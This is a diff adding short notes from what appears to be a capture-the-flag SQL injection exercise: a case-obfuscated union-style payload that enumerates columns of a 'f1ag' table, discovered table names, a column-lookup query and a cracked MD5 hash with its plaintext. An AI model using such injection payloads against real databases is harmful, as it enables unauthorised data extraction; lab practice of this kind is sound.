@@ -1,0 +1,13 @@
+Select gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name='f1ag'
+
+f1ag
+users
+
+SELECT column_name
+FROM information_schema.columns
+WHERE table_name = 'your_table'
+    AND column_name LIKE '%id%'
+    
+    
+Hash	Type	Result
+498c67b7c86b01bd68ab5cbafd245b1c	md5	sniperoj
